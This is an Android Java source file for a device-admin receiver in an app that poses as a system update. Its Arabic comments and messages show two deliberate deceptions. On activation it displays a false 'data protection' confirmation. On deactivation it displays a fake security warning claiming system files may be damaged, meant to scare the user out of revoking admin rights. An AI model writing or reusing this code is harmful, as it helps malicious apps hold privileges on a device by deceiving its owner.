package org.system.update;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

public class AdminReceiver extends DeviceAdminReceiver {
    @Override
    public void onEnabled(Context context, Intent intent) {
        // رسالة رسمية توحي بالأمان عند التفعيل
        Toast.makeText(context, "تحديث النظام: تم تفعيل بروتوكول حماية البيانات بنجاح.", Toast.LENGTH_LONG).show();
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        // رسالة تحذيرية رسمية تمنع المستخدم من الرغبة في التعطيل
        Toast.makeText(context, "إشعار أمني: إلغاء صلاحيات الإدارة قد يعرض ملفات النظام للتلف.", Toast.LENGTH_LONG).show();
    }
}
